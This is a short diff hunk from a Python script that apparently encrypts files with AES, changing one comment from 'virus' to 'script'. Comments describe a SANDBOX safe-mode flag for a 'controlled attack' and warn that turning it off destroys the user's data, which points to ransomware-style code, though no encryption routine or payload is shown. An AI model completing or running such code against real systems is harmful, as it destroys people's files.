@@ -14,7 +14,7 @@ from getpass import getuser as gu	# For getting the user who is running the scri
 
 from Crypto.Cipher import AES	# AES functions. For encrypting files.
 
-SANDBOX = True	# Safe mode (controlled attack of the virus).
+SANDBOX = True	# Safe mode (controlled attack of the script).
 #SANDBOX = False	# This will fuck up the user's data. DO NOT EVEN THINK ABOUT RUNNING AS ROOT.
 
 BS = 16	# Block size in bytes.
